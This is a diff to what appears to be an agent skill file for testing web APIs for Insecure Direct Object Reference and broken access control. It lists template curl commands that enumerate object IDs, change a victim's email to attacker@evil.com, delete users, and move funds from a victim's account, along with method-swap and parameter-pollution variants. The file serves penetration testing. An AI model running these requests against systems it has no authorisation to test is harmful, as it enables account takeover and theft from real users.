@@ -2,6 +2,8 @@
 name: attack-idor-automation
 description: Use when a target exposes user-scoped API endpoints and you have two accounts of different privilege levels, to systematically test for Insecure Direct Object Reference and broken access control.
 metadata:
+  acordia:
+    family: web-attack
   cyberstrike:
     source: .cyberstrike/skill/attack-idor-automation/SKILL.md
     commit: 359655518
@@ -64,6 +66,12 @@ curl -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/UUID_OF_
 for id in $(seq 1 100); do
   curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer ATTACKER_TOKEN" "https://TARGET/api/orders/$id"
 done
+
+# UUID/GUID swap — capture another user's UUID from an earlier response instead of
+# guessing it, then substitute it into /api/profile/{uuid}, /api/orders/{uuid}
+
+# Cookie-session applications: replace the bearer header with the session cookie,
+# e.g. -H "Cookie: session=LOW_PRIV_SESSION"
 ```
 
 **Vertical IDOR (low-priv accessing high-priv):**
@@ -83,6 +91,9 @@ curl -X DELETE -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/user
 # GET blocked but PATCH works
 curl -X PATCH -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID \
   -d '{"email":"attacker@evil.com"}'
+
+# GET blocked but POST works
+curl -X POST -H "Authorization: Bearer ATTACKER_TOKEN" https://TARGET/api/users/VICTIM_ID
 ```
 
 ### Phase 5: Parameter Pollution
@@ -95,6 +106,9 @@ curl "https://TARGET/api/profile?user_id=ATTACKER&user_id=VICTIM"
 curl -X POST https://TARGET/api/transfer \
   -H "Authorization: Bearer ATTACKER_TOKEN" \
   -d '{"from":"VICTIM_ID","to":"ATTACKER_ID","amount":1000}'
+
+# Parameter-based IDOR — swap the object reference in the body or query string:
+# user_id, account_id, order_id; and the authorisation fields role, group_id, org_id
 ```
 
 ### Phase 6: Response Comparison
